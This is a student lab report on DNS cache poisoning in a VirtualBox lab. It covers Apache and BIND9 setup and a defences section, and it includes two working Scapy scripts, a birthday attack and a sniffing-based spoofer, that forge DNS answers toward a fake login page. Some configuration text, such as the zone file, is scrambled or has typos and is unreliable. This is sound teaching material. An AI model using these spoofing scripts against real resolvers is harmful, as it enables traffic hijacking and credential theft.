b'Network Security \n\n \n\nDNS Cache Poisoning \n\nLab \n\n \n\n \n\nAA 2015/16 \n\n \n\n \n\n \n\nGroup 14 \n\nBruno Boscia \n\nDavide Todeschi \n\nGiacomo Filippetto \n\n \n\n \n\n \n\n \n\n\x0cSUMMARY \n\n \n\n \n\n- 0. INTRODUCTION \n\n- 1. SETUP \n\n \n\n \n\n \n\n \n\n- 1.1 VirtualBox \n\n- 1.2 Machine 1 \n\n \n\n \n\n \n\n- 1.2.1 Web server \n\n- 1.2.2 DNS \n\n- 1.2.3 Network interface \n\n- 1.3 Machine 2 \n\n \n\n \n\n- 1.3.1 DNS \n\n- 1.3.2 Network interface \n\n- 1.4 Machine 3 \n\n \n\n \n\n \n\n- 1.4.1 Python/Scapy \n\n- 1.4.2 Wireshark \n\n- 1.4.3 Network interface \n\n- 2. BIRTHDAY ATTACK \n\n- 3. DEFENSES \n\n- 4. PACKETS SNIFFING ATTACK \n\n- 5. CONCLUSION \n\n \n\n \n\n \n\n\x0c0.  INTRODUCTION \n\n \n\nWhat  is  DNS?  Domain  Name  System  has  been  created  to  translate  human-\n\nfriendly  Domain  names  into  machine-friendly  numerical  addresses,  the  IP \n\naddresses,  used  by  the  network  to  establish  communications  between  the \n\nnodes of the net. \n\nWhenever  someone  looks  for  \xe2\x80\x9cwebsite.com\xe2\x80\x9d,  the  DNS  translates  it  to  an  IP \n\naddress and sends this address back to the computer from which the request \n\nwas made, as if someone was looking for somebody\xe2\x80\x99s phone number into the \n\nphone book. \n\nThe servers that do this operations (the Domain Name Servers, precisely) are \n\ndifferentiated  into:  Root  ones,  Authoritative  ones  and  Recursive  ones.  The \n\nformers are responsible for top level domain queries (e.g., .com, .org, .it). The \n\nsecond  ones  are  responsible  for  queries  regarding  their  own  domains, \n\nspecifically set by the domain administrator. Lastly, Recursive servers are asked \n\nto answer the DNS queries they receive; If they do not know the answer yet, \n\nthey recur to an algorithm necessary to resolve a given name, starting with the \n\nDNS root through the Authoritative name servers of the queried domain. \n\nIn order to increase performances, Recursive servers cache the answers (of the \n\nqueries they have answered) for a given time. This mechanism is vulnerable to \n\nthe  so  called  \xe2\x80\x98DNS  cache  poisoning\xe2\x80\x99.  This  is  a  computer  hacking  attack, \n\nwhereby data is introduced into the cache of a Domain Name System resolver, \n\ncausing the name server to return an incorrect IP address, diverting traffic to \n\nanother computer (usually under the attacker\xe2\x80\x99s control). \n\nThe  aim  of  this  laboratory  session  is  to  show  a  possible  scenario  for  a  DNS \n\ncache poisoning attack.  \n\n \n\n\x0c1.  SETUP \n\n \n\nOur lab environment exploits Virtualbox and it is composed by 3 Virtual \n\nMachines, one running an Ubuntu 14.04 OS and the other two running Debian \n\n8.4. Each machine is configured as shown in the following picture. \n\n \n\n \n\n \n\nThe central Debian machine consists in a simple recursive DNS server which, in \n\nthe following, will be referred as REC_DNS_Server. It has only one network \n\ninterface with the ip address \xe2\x80\x9c192.168.56.103\xe2\x80\x9d. \n\nThe other debian machine is a bit more complex than the previous one. It \n\npresents two network interfaces with ip addresses \xe2\x80\x9c192.168.56.101\xe2\x80\x9d and \n\n\xe2\x80\x9c192.168.56.102\xe2\x80\x9d. The first one is responsible for the website \n\n\xe2\x80\x9crealwebsite.netsec\xe2\x80\x9d, and at the same time has the function of authoritative \n\nDNS server for this domain. The second one is responsible for the website \n\n\x0c\xe2\x80\x9cfakewebsite.netsec\xe2\x80\x9d. This machine will be referred as AUT_DNS_Server from \n\nnow on. \n\nThe Ubuntu machine, as the REC_DNS_Server, presents only one network \n\ninterface with the ip address \xe2\x80\x9c192.168.56.102\xe2\x80\x9d. It has two main functions: \n\nattacker and victim. As attacker we consider the user who exploits tools such \n\nas Scapy and Wireshark in order to poison the REC_DNS_Server cache, while \n\nthe victim is a user who looks for \xe2\x80\x9crealwebsite.netsec\xe2\x80\x9d through the browser. \n\nFor simplicity the machine will be referred as Ubuntu_Attacker. It is important \n\nto notice that these two entities are usually completely unrelated but, in order \n\nto keep the lab hardware requirements low, we chose to merge them into a \n\nsingle machine. This also stands for the AUT_DNS_Server machine, which is \n\ncomposed by two completely different entities, the real server and the \n\nmalicious one, merged into one. However the lab outcome and the attack \n\neffects will be exactly the same as if you decided to split them into different \n\nmachines.  \n\nThe following will present how to configure the machines. \n\n \n\n \n\n1.1.  VirtualBox \n\n \n\nDownload  and \n\ninstall  Oracle  VirtualBox  on  your  host  machine  from \n\nhttps://www.virtualbox.org/ \n\nDownload \n\nthe \n\nDebian \n\ninstallation \n\ndisk \n\nimage \n\nfrom: \n\nhttps://www.debian.org/CD/http-ftp/  \n\nDownload  the  Ubuntu  installation  disk  image  from  http://www.ubuntu-\n\nit.org/download \n\n\x0cOpen VirtualBox and create three new virtual machines, two Debian and one \n\nUbuntu (we used Debian to lighten the computational load). The two Debians \n\nwill  be  the  Authoritative  and  Recursive  DNS  servers  respectively,  while  the \n\nUbuntu  machine  will  be  the  attacker  (and  victim,  too).  As  previously \n\nhighlighted  we  called \n\nthem  AUT_DNS_Server,  REC_DNS_Server  and \n\nUbuntu_Attacker. \n\nIn order to install the machines, mount the disk image on each of  them and \n\nthen run the VMs following the instructions given during the setup. \n\nNow, right click on the machine, choose \xe2\x80\x98settings\xe2\x80\x99->\xe2\x80\x98network\xe2\x80\x99. On \xe2\x80\x98Adapter 1\xe2\x80\x99, \n\ncheck \xe2\x80\x98enable network adapter\xe2\x80\x99 and select attached to \xe2\x80\x98Host-only-adapter\xe2\x80\x99. Be \n\nsure that promiscuous mode is set to \xe2\x80\x98Allow all\xe2\x80\x99. In the \xe2\x80\x98adapter 2\xe2\x80\x99 tab, check \n\n\xe2\x80\x98enable network adapter\xe2\x80\x99 and select attached to \xe2\x80\x98NAT\xe2\x80\x99.  \n\nNow, restart the VMs. \n\nNB: consider to use the same username and password for all the machines. We \n\nused username \xe2\x80\x98user\xe2\x80\x99 and password \xe2\x80\x98netsec\xe2\x80\x99. \n\n \n\n \n\n1.2.  Machine 1 - AUT_DNS_Server \n\n \n\n1.2.1. \n\nWeb server - Apache2 \n\n \n\nFirst of all, log in as SuperUser (you can do it by typing the command \xe2\x80\x98su\xe2\x80\x99 and \n\nentering  the  password  you  set  during  the  configuration).  Then,  run  the \n\ncommand  \n\n> apt-get install apache2 \n\nThis will install Apache2 on your machine. \n\n\x0cNow,  what  you  have  to  do  is  to  write  the  two  web  pages  that  we  will  use. \n\nCreate a directory in /var/www called RealWebSite.netsec. \n\nUse the command \n\n> mkdir /var/www/RealWebSite.netsec \n\nWith  your  favorite  text  editor  (e.g.  we  used  \xe2\x80\x98nano\xe2\x80\x99),  create  a  new  html  file \n\ncalled \xe2\x80\x98index.html\xe2\x80\x99 in the directory you created. \n\n> nano /var/www/RealWebSite.netsec/index.html  \n\nNow, write: \n\n \n\n<!DOCTYPE html> \n\n<html> \n\n<head> \n\n \n\n \n\n<meta charset=\xe2\x80\x9dutf-8\xe2\x80\x9d> \n\n<title>Real Webpage</title> \n\n</head> \n\n<body> \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n<center> \n\n<h1>Real Webpage</h1> \n\n<table border=\xe2\x80\x9d1\xe2\x80\x9d> \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n<tr><td> \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n<table> \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n<tr> \n\n \n\n \n\n</tr> \n\n<tr> \n\n \n\n \n\n</tr> \n\n<tr> \n\n \n\n \n\n</tr> \n\n</table> \n\n</td></tr> \n\n<td>name:</td> \n\n<td><input name=\xe2\x80\x9dusername\xe2\x80\x9d/></td> \n\n<td>password:</td> \n\n<td><input name=\xe2\x80\x9dpassword\xe2\x80\x9d type=\xe2\x80\x9dpassword\xe2\x80\x9d/></td> \n\n<td/> \n\n<td align=\xe2\x80\x9dcenter\xe2\x80\x9d><input type=\xe2\x80\x9dbutton\xe2\x80\x9d value=\xe2\x80\x9dlogin\xe2\x80\x9d/></td> \n\n\x0c</table> \n\n</center> \n\n \n\n \n\n \n\n \n\n</body> \n\n</html> \n\n \n\nThis will create a simple web page that look like this \n\n \n\n \n\n \n\nThen you have to create the fake web page. This page will be almost the same \n\nas the Real one, so you can copy it \n\n> mkdir /var/www/FakeWebPage.netsec \n\n> cp /var/www/RealWebPage.netsec/index.html /var/www/FakeWebPage.netsec/index.html \n\nAll you have to do is to change the titles to \xe2\x80\x98Fake Webpage\xe2\x80\x99 \n\n> nano /var/www/FakeWebPage.netsec/index.html \n\nLastly  you  have \n\nto  edit \n\nthe  apache2  configuration \n\nfile,  which \n\nis \n\n\xe2\x80\x98/etc/apache2/apache2.conf\xe2\x80\x99 and add those lines: \n\n \n\n<VirtualHost 192.168.56.101:80> \n\n \n\n \n\n \n\n \n\n \n\n \n\nDocumentRoot /var/www/RealWebSite.netsec \n\nServerName www.RealWebSite.netsec \n\n<Directory /var/www/RealWebSite.netsec/> \n\n \n\n \n\nOptions FollowSymLinks \n\nAllowOverride None \n\n\x0c \n\n \n\n \n\nRequire all granted \n\n</Directory> \n\n</VirtualHost> \n\n \n\n<VirtualHost 192.168.56.102:80> \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\nDocumentRoot /var/www/FakeWebSite.netsec \n\nServerName www.FakeWebSite.netsec \n\n \n\n<Directory /var/www/FakeWebSite.netsec \n\n \n\n \n\n \n\nOptions FollowSymLinks \n\nAllowOverride None \n\nRequire all granted \n\n</Directory> \n\n</VirtualHost> \n\n \n\nWhat  we  are  doing  here  is  to  configure  apache2  to  associate  the  ip  address \n\n192.168.56.101  (port  80)  to  www.realwebsite.netsec  and  the  ip  address \n\n192.168.56.102 (still port 80) to www.fakewebsite.netsec. As you will see later, \n\nwe are going to configure two network adapter for this machine and we want \n\nto  discriminate  which  website  to  load  by  using  the  requested  IP  address.  By \n\ndefault, the first web page loaded in each website is index.html. \n\n \n\n \n\n1.2.2. \n\nDomain Name System - Bind9 \n\n \n\nInstall Bind9 by typing \n\n> apt-get install bind9 bind9utils \n\nWhen \n\nthe \n\ninstallation \n\nis \n\nover, \n\nopen \n\nthe \n\nconfiguration \n\nfile \n\n/etc/bind/named.conf.option with your text editor. \n\n> nano /etc/bind/named.conf.option \n\nChange your file\xe2\x80\x99s contents to be similar to \n\n \n\n\x0coptions { \n\ndirectory \xe2\x80\x9c/var/cache/bind\xe2\x80\x9d; \n\nrecursion no; \n\n \n\n// this will deactivate recursion \n\nallow-transfer {none;}; \n\n// this will deactivate transfer \n\ndnssec-enable no; \n\nauth-nxdomain no; \n\nlisten-on-v6 {any;}; \n\n \n\n \n\n \n\n \n\n \n\n \n\n}; \n\n \n\nBefore you go on, you need to set the correct hostname and domain name of \n\nthe machine. Set the hostname in /etc/hostname \n\n> nano /etc/hostname \n\nIn  our  setup,  we  used  the  name  \xe2\x80\x98debianDNSServer\xe2\x80\x99  (you  can  also  use \n\nAUT_DNS_Server). In order to make the modification effective, run \n\n> hostname -F /etc/hostname \n\nThen, you can change the domain name by modifying the file /etc/hosts \n\n> nano /etc/hosts \n\nAdd the line \n\n192.168.56.101  debianDNSServer.RealWebPage.netsec debianDNSServer \n\nOnce  you  have  done  this,  you  have  to  define  the  zone  RealWebSite.netsec. \n\nFirstly,  create  the  directory  where  we  are  going  to  put  the  files  defining  our \n\nzones. \n\n> mkdir /etc/bind/zones \n\nthen , create a new file and call it \xe2\x80\x98db.RealWebSite.netsec\xe2\x80\x99. \n\n> nano /etc/bind/zones/db.RealWebSite.netsec \n\nInside the \xe2\x80\x98zones\xe2\x80\x99 file we will find the association between the name and the \n\nactual respective IP address. So, we will write \n\n \n\n; \n\n; BIND data file for local loopback interface \n\n; \n\n$TTL 604800 \n\n@ \n\nIN \n\nSOA \n\ndebianDNSServer.RealWebSite.netsec. root.debianDNSServer.RealWebSite.netsec. ( \n\n\x0c5 \n\n \n\n; Serial \n\n604800  ; Refresh \n\n86400 \n\n; Retry \n\n2419200 ; Expire \n\n604800 ) ; Negative Cache TTL \n\n \n\n \n\n \n\n \n\n \n\n; \n\nnetsec.   \n\n \n\nRealWebSite.netsec. \n\ndebianDNSServer IN \n\n@ \n\nwww \n\n \n\n \n\n \n\n \n\n \n\nIN \n\nIN \n\nA \n\n \n\n \n\nA \n\nNS \n\n192.168.56.101 \n\ndebianDNSServer.RealWebSite.netsec. \n\n192.168.56.101 \n\nIN \n\nIN \n\nA \n\nA \n\n192.168.56.101 \n\n192.168.56.101 \n\nWhere the two lines we are particularly interested in are: \n\n \n\nRealWebSite.netsec. \n\ndebianDNSServer IN \n\nIN \n\nA \n\n \n\nNS \n\ndebianDNSServer.RealWebSite.netsec. \n\n192.168.56.101 \n\nThe \n\nformer \n\nspecifies \n\nthat \n\nthe  DNS \n\nresponsible \n\nfor \n\nthe  domain \n\nRealWebSite.netsec  is  debianDNSServer,  while  the  latter  specifies  what  the \n\naddress of debianDNSServer is. \n\nNow, we need to add the file defining our zone to the configuration of Bind. To \n\ndo this, append the following lines to the file /etc/bind/named.conf.local \n\n \n\nzone \xe2\x80\x9cRealWebSite.netsec\xe2\x80\x9d{ \n\ntype master; \n\nFile \xe2\x80\x9c/etc/bind/zones/db.RealWebSite.netsec\xe2\x80\x9d; \n\n \n\n \n\n}; \n\n \n\nAs usually, open the file with \n\n> nano /etc/bind/named.conf.local \n\nNow save and exit. \n\n \n\n\x0c \n\n1.2.3. \n\nNetwork Interface \n\n \n\nLastly, we need to configure the network interfaces for this machine.  \n\n> nano /etc/network/interfaces \n\nAs  said  before,  we  will  need  two  of  them  (in  addition  to  the  loopback \n\ninterface). Then, change the file to make it similar to: \n\n \n\nsource /etc/network/interfaces.d/* \n\nauto lo \n\niface lo inet loopback \n\n \n\nauto eth0 \n\niface eth0 inet static \n\nAddress 192.168.56.101 \n\nNetmask 255.255.255.0 \n\ngateway 192.168.56.1 \n\n \n\n \n\n \n\n \n\nIface eth1 inet static \n\naddress 192.168.56.102 \n\nnetmask 255.255.255.0 \n\ngateway 192.168.56.1 \n\n \n\n \n\nShutdown the machine. \n\nIf  you  installed  the  Debian  console-only  distribution,  like  we  did,  run  the \n\ncommand \n\n> shutdown -h now \n\nto shutdown the machine. \n\nIn VirtualBox, right-click on the machine, then settings -> network and change \n\nadapter 2 to be \xe2\x80\x98Host-only\xe2\x80\x99. Once this is done, restart the machine. \n\n \n\n \n\n\x0c1.3.  Machine 2 - REC_DNS_Server \n\n \n\n1.3.1. \n\nDomain Name System - BIND9 \n\n \n\nAs with the previous machine, install Bind9 by typing \n\n> apt-get install bind9 bind9utils \n\nThis \n\ntime  we \n\nonly \n\nhave \n\nto  modify \n\nthe \n\nconfiguration \n\nfile \n\n/etc/bind/named.conf.option \n\n> nano /etc/bind/named.conf.option \n\nThe content of the file has to be similar to \n\n \n\nacl \xe2\x80\x9ctrusted\xe2\x80\x9d { \n\n \n\n \n\n127.0.0.1; \n\n192.168.56.101; \n\n192.168.56.102; \n\n192.168.56.103; \n\n192.168.56.104; \n\n}; \n\noptions { \n\ndirectory \xe2\x80\x9c/var/cache/bind\xe2\x80\x9d; \n\nlisten-on port 53 {any;}; \n\n \n\nquery-source port 22222; \n\ndnssec-enable no; \n\nrandom-device \xe2\x80\x9c/device/random\xe2\x80\x9d; \n\nauth-nxdomain no; \n\nlisten-on-v6 {any;}; \n\n//this line specify the recursion is active for the trusted clients \n\nrecursion yes; \n\nallow -recursion { trusted; }; \n\n// while this one specify to who forward the queries we don\xe2\x80\x99t know how to translate \n\nforwardes { \n\n192.168.56.101; \n\n \n\n} \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n \n\n}; \n\n\x0c1.3.2. \n\nNetwork Interface \n\n \n\nThe other thing we need to configure on this machine is the network interface. \n\n> nano /etc/network/interfaces \n\n \n\nsource /etc/network/interfaces.d/* \n\nauto lo \n\niface lo inet loopback \n\n \n\nauto eth0 \n\niface eth0 inet static \n\nAddress 192.168.56.103 \n\nNetmask 255.255.255.0 \n\ngateway 192.168.56.101 \n\n \n\n \n\n \n\n \n\nNow, shutdown the machine. \n\nIn VirtualBox, right-click on the machine, then settings -> network and disable \n\nthe second adapter.  \n\nRestart the machine. \n\n \n\n \n\n1.4.  Machine 3 - Ubuntu_Attacker \n\n \n\n1.4.1. \n\nScapy \n\n \n\nScapy  is  a  packet  manipulation  tool  for  computer  networks.  It  can  forge  or \n\ndecode  packets,  send  them  on  the  wire,  capture  them,  and  match  requests \n\nand replies. \n\n\x0cA prerequisite to use scapy is python since scapy is a python module. Ubuntu \n\nOS present python installed by default, so we only have to install scapy typing \n\nthe following command in the terminal: \n\n>sudo apt-get install python-scapy \n\n \n\n \n\n1.4.2. \n\nWireshark \n\n \n\nWireshark  is  a  network  packet  analyzer.  We  will  use  this  tool  to  look  at  the \n\ntraffic over the network. \n\nTo install it, open the Terminal and simply type the following commands: \n\n \n\n> sudo apt-get install wireshark \n\n> sudo groupadd wireshark \n\n> sudo usermod -a -G wireshark *YOUR_USER_NAME* \n\n> sudo chgrp wireshark /usr/bin/dumpcap \n\n> sudo chmod 750 /usr/bin/dumpcap \n\n> sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap \n\n> sudo getcap /usr/bin/dumpcap \n\n \n\n \n\n1.4.3. \n\nNetwork Interface \n\n \n\nAs before, we need to configure the network interface. \n\n> nano /etc/network/interfaces \n\n \n\nsource /etc/network/interfaces.d/* \n\nauto lo \n\niface lo inet loopback \n\n \n\nauto eth0 \n\niface eth0 inet static \n\n\x0cAddress 192.168.56.104 \n\nNetmask 255.255.255.0 \n\ngateway 192.168.56.101 \n\ndns-nameservers 192.168.56.103 \n\n \n\n \n\n \n\n \n\n \n\nThe last line in particular specify the IP address of the DNS server we want to \n\nuse. In this case the client will use the Recursive one. \n\nNow, shutdown the machine. \n\nIn VirtualBox, right-click on the machine, then settings -> network and disable \n\nthe second adapter. Restart the machine. \n\n \n\n \n\n\x0c2. BIRTHDAY ATTACK \n\n \n\nThe  first  type  of  attack  we  will  see  is  the  so  called  \xe2\x80\x9cBirthday  attack\xe2\x80\x9d,  which \n\ntakes its name from the birthday paradox. \n\nThis attack assume the server use a fixed UDP port; we already configured port \n\n22222 during the setup phase. \n\nAs a first step the attacker performs a Denial of Service on  the Authoritative \n\nDNS, in order to jam any type of communication towards it. \n\nThen, he starts to generate a series of DNS queries that the Recursive DNS will \n\ntry  to  resolve  by  asking  the  Authoritative  one,  which  is  blocked  though.  The \n\nrequested website should be enough popular to assume that a user will look \n\nfor  it  with  an  high  probability  in  any  moment  in  order  to  make  the  attack \n\neffective. \n\nThanks  to  the  DoS,  the  attacker  earns  some  time  and,  pretending  to  be  the \n\nAuthoritative  DNS,  generates  a  lot  of  false  DNS  responses  with  different \n\ntransaction IDs, trying to find a match with the IDs of the queries the Recursive \n\nserver is forwarding to Authoritative DNS. \n\nSince the transaction ID is a 16-bit number, the birthday attack achieves a 90% \n\nprobability of success with about 600 different transaction IDs, which are not \n\nso many.  \n\nHere you find a few useful commands to be used in the Recursive DNS VM: \n\n \n\n> rndc dumpdb -cache \n\n> nano /var/cache/bind/named_dump.db \n\n> rndc flush \n\n \n\n\x0cThe  first  one  allows  you  to  save  the  cache  on  a  file  (defined  by  us  in  the \n\nconfiguration),  which  can  be  visualized  by  typing  the  second  command.  The \n\nlast one simply reset the cache. \n\nThis  is  the  python  script  exploiting  scapy  we  used  to  perform  the  birthday \n\nattack: \n\n \n\nfrom scapy.all import * \n\nfrom random import randint \n\n \n\nAUT_IP = "192.168.56.101" \n\nREC_IP = "192.168.56.103" \n\nMAL_IP = "192.168.56.102" \n\n \n\nwebsite = "www.realwebsite.netsec" \n\nREC_UDP_PORT = 22222 \n\n \n\nrequest=IP(dst=REC_IP)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=website)) \n\nresponse=(IP(dst=REC_IP, src=AUT_IP)\\ \n\n    \n\n/UDP(dport=REC_UDP_PORT,sport=53)\\ \n\n/DNS(id=0,qr=1L,aa=1L,qd=request[DNS].qd,qdcount=1,rd=1,ancount=1,nscount=1,arcount=\n\n0,an=(DNSRR(rrname=request[DNS].qd.qname,type=\'A\',ttl=3600,rdata=MAL_IP)))) \n\nfor x in range(0,600): \n\n    request[UDP].sport=x+50000 \n\n    send(request,verbose=0) \n\n    response[DNS].id=randint(0,65536) \n\n    send(response,verbose=0) \n\n    print x \n\n \n\nIn the first part, you can see the fixed IP addresses for the VMs. Then, there are \n\ntwo  variables  representing  the  domain  name  we  are  trying  to  spoof  and  the \n\nUDP port we fixed, respectively. After that, a DNS request for the website and \n\nthe corresponding DNS response are generated. \n\nThe  script  therefore  sets  the  transaction  ID  of  the  response  to  a  random \n\nnumber and sends the updated packet over the network. It does it 600 times, \n\n\x0choping  to  guess  the  right  ID  and  poison  the  Recursive  DNS.  Each  time  a  new \n\niteration  is  done  the  UDP  source  port  is  changed,  just  to  distinguish  among \n\nthem. \n\nBefore  we  run  the  script,  however,  we  should  perform  a  DoS  attack  on  the \n\nAuthoritative DNS. Since it is not the purpose of this laboratory, we can cheat a \n\nlittle  and  block  it  in  another  manner,  by  adding  a  special  rule  to  the \n\nAUT_DNS_Server\xe2\x80\x99s firewall. Just enter the following command: \n\n> iptables -A INPUT -s 192.168.56.103 -j DROP \n\nBy doing this, the Authoritative DNS will drop every packet incoming from that \n\nIP address (which is  the Recursive DNS). In case you want or need to restore \n\nthe previous rules, just type the opposite command, which is:  \n\n> iptables -D INPUT -s 192.168.56.103 -j DROP \n\nThis command shows instead the actual rules: \n\n> iptables -L \n\nIn this way, we have just set up a simple but didactic-useful firewall. \n\nIn order to check out that the Authoritative DNS is dropping the right packets, \n\njust try to ping its IP address from the Recursive DNS, they should receive no \n\nanswers.  If  you  receive  answers,  you  should  check  you  enter  the  command \n\nproperly and retry. \n\nTo  perform  the  attack,  simply  run  the  script  from  the  Attacker  VM:  navigate \n\nthrough the folder where the file is, start a terminal and run: \n\n> sudo python .../birthday_attack.py \n\nIn  the  terminal  you  will  not  see  anything  important,  but  you  can  check  the \n\nresult  of \n\nthe  attack \n\nfrom \n\nthe  browser.  Open \n\nit  and  go \n\nto \n\n\xe2\x80\x9cwww.realwebsite.netsec\xe2\x80\x9d:  if  you  are  redirected  to  a  page  saying  \xe2\x80\x98Real \n\nWebpage\xe2\x80\x99  the  attack  was  a  failure;  instead,  if  you  see  \xe2\x80\x98Fake  Webpage\xe2\x80\x99  the \n\nattack was a success and the Recursive DNS cached that domain name with the \n\nwrong IP address. \n\n\x0cUnless  you are really, really lucky, your attack went wrong: this  is  due to the \n\nfact that Birthday attacks were only possible exploiting a vulnerability present \n\non version 4 (and previous ones) of Bind. In fact, the behavior by which Bind \n\nused to recursively  resolve the same name as many times as you ask him to \n\ndo, was the way an attacker could exploit the birthday attack. \n\nBind9  prevents  this  by  grouping  requests  for  the  same  resource  in  a  single \n\nrecursive DNS query.  \n\nWe wanted to show this kind of attack, even if it no longer works nowadays, \n\nbecause we found particularly interesting the way it used to work: even if it is \n\nno  longer  a  threat  in  DNS  security,  it  could  be  so  for  other  application  layer \n\nprotocols. \n\n \n\n \n\n\x0c3. DEFENSES \n\n \n\nWe will now see a few ways through which Bind9 tries to prevent a DNS cache \n\npoisoning attack. \n\nThe first one has been already highlighted through the previous attack. It fixes \n\nthe vulnerability of Bind4 for which we could perform a birthday attack, since it \n\nallows the recursive DNS server to send a unique request to the authoritative \n\nserver for a group of equal requests arriving from the user.  The figure below \n\nshows how it would work. \n\n \n\n \n\n \n\nAnother  kind  of  defense  strategy  implemented  in  Bind9  consists  in  the  UDP \n\nport randomization, which strongly decreases the probability to guess the right \n\nfield values when forging a fake Authoritative DNS response. \n\n\x0cTo achieve this we have to modify the file found in the DNS_REC_Server at this \n\npath \xe2\x80\x9cetc/bind/named.conf.options\xe2\x80\x9d easily typing in the terminal \n\n \n\n> nano /etc/bind/named.conf.options \n\nremoving  the  line  \xe2\x80\x9cquery-source  port  22222;\xe2\x80\x9d.  By  default  this  line  is  not \n\npresent  in  the  configuration  file  of  Bind,  we  actually  inserted  it  intentionally. \n\nOur  point  here  is  to  clarify why  it should  not  be  added.  Considering  only  the \n\ntransaction ID randomization we had 2^16 possible combinations, while adding \n\nalso the port randomization they increase up to 2^32. \n\nMoreover, Bind9 improves the randomization capacity with respect to Bind8, \n\nexploiting  the  Ubuntu  randomization  algorithm  in  order  to  decrease  the \n\npredictability  of  the  created  random  values,  such  as  transaction  ID  and  UDP \n\nport. \n\n  This \n\nis  achieved  by  setting \n\nthe \n\nrandom-device  option \n\nto \n\n\xe2\x80\x9c/device/random\xe2\x80\x9d. \n\nHowever, these defense strategies would be useless in case the attacker was \n\nable  to  access  the  network  traffic  and  to  sniff  the  packets  containing  the \n\ninformation to forge an effective fake DNS response. \n\n \n\n \n\n\x0c4. PACKETS SNIFFING ATTACK \n\n \n\nAn  attack  that  actually  work  is  the  one  that  exploits  packet  sniffing.  What \n\nmakes  it  effective  is  the  fact  that  the  attacker  is  able  to  discover  all  the \n\ninformation  he  actually  needs:  transaction  ID,  UDP  port  and  content  of  the \n\nDNS  request  made  by  the  recursive  DNS  server.  The  figure  below  briefly \n\nexplain how the attack is developed. \n\n \n\n \n\n \n\nThe tool we will exploit for this kind of attack is scapy, which allows us to both \n\nsniff and forge packets. \n\nBefore  any  packet  is  sent,  we  need  to  run  our  python  script  on  the  attacker \n\nmachine, so that scapy starts sniffing the network traffic. \n\nOpen the terminal on the attacker machine and type: \n\n \n\n> sudo python /home/user/Desktop/sniffing_attack.py \n\n\x0cThe script is shown below and allows to create a DNS response on the base of \n\nthe DNS request sniffed from the recursive DNS server. \n\n \n\nfrom scapy.all import * \n\nAuthoritative_DNS_IP = "192.168.56.101" \n\nRecursive_DNS_IP = "192.168.56.103" \n\nMalicious_IP = "192.168.56.102" \n\n \n\ndef DNS_Responder(AUT_IP, REC_IP, MAL_IP): \n\n    def getResponse(pkt): \n\n    # check ancount \n\n    \n\n if (DNS in pkt and pkt[DNS].opcode==0L and pkt[DNS].ancount==0 and pkt[IP].src==REC_IP \n\nand pkt[IP].dst==AUT_IP): \n\n    \n\n    \n\n    \n\n    \n\n \n\n \n\n \n\n \n\n if "realwebsite.netsec" in pkt[\'DNS Question Record\'].qname: \n\n \n\n \n\n \n\n spfResp=IP(dst=pkt[IP].src, src=pkt[IP].dst)\\ \n\n \n\n \n\n /UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)\\ \n\n \n\n/DNS(id=pkt[DNS].id,qr=1L,aa=1L,qd=pkt[DNS].qd,qdcount=1,rd=1,ancount=1,nscount=0,arcount=0,\n\nan=(DNSRR(rrname=pkt[DNS].qd.qname,type=\'A\',ttl=3600,rdata=MAL_IP))) \n\n    \n\n    \n\n    \n\n    \n\n    \n\n    \n\n send(spfResp,verbose=1) \n\n return "Spoofed DNS Response Sent " + pkt[\'DNS Question Record\'].qname \n\n \n\n \n\n else: \n\n \n\n return "Don\'t care " + pkt[\'DNS Question Record\'].qname \n\n \n\n \n\n \n\n \n\n else: \n\n \n\n return "Don\'t care" \n\n    return getResponse \n\n \n\nsniff(prn=DNS_Responder(Authoritative_DNS_IP, Recursive_DNS_IP, Malicious_IP)) \n\n \n\nThe code is relatively simple, the \xe2\x80\x9csniff\xe2\x80\x9d function of Scapy has been exploited \n\n(last line). It simply sniff all the packets in the network, and applies a \xe2\x80\x98prn\xe2\x80\x99 filter \n\nto  all  of  them.  We  created  our  custom  filtering  function,  which \n\nis \n\nDNS_Responder().  First  of  all,  it  checks  whether  the  packet  is  a  suitable  DNS \n\nquery  (the  first  \xe2\x80\x98if\xe2\x80\x99  condition).  Then  it  check  if  the  query  is  asking  for  our \n\nparticular  website  or  not;  if  it  is,  it  creates  an  ad-hoc  response  switching \n\n\x0cdestination  and  source  in  all  the  fields  of  the  spoofed  packet,  reproducing  in \n\nthis way a real response. \n\n \n\nThe  first  step  consists  in  the  DNS  request  made  by  a  victim  user  towards  its \n\nRecursive  DNS  at  the  address  of  the  recursive  DNS  server  (192.168.56.103). \n\nThis  can  be  accomplished  by  just  typing  in  the  terminal  of  the  victim  user \n\nmachine: \n\n \n\n> ping www.realwebsite.netsec \n\nThe  Recursive  DNS  server  will  automatically  forward  the  request  to  the \n\nAuthoritative  server  at  the  address  \xe2\x80\x9c192.168.56.101\xe2\x80\x9d.  This  is  the  packet  the \n\nattacker needs to sniff in order to forge the fake DNS response. \n\nThe script we ran previously will automatically send the fake response, which \n\ncontains the address \xe2\x80\x9c192.168.56.102\xe2\x80\x9d (the fake website), as soon as it sniffs \n\nthis request. \n\nAt this point, the DNS recursive server receives the DNS response forged by the \n\nattacker and stores in its cache the following record: \n\n \n\nrealwebsite.netsec at 192.168.56.102 \n\nIts cache has been poisoned! \n\nThe record is sent to the victim user. If we go on the user machine, open the \n\nbrowser  and  then  type  the  URL  \xe2\x80\x9cwww.realwebsite.netsec\xe2\x80\x9d,  we  are  going  to \n\nfind the fake website, as in the figure shown below. \n\n \n\n \n\n\x0cChecking the cache in the Recursive server with the commands \n\n \n\n> rndc dumpdb -cache \n\n> nano /var/cache/bind/named_dump.db \n\n \n\nyou will see the poisoned record. \n\nThe time to live of a record is usually very high. In this case we are using the \n\ndefault  value  which  is  7  days!  This  is  because  names  usually don\xe2\x80\x99t  change  so \n\noften, so there is no point in dropping a record too frequently.  \n\nAny other client which uses the same DNS server will be affected by the attack. \n\n \n\n 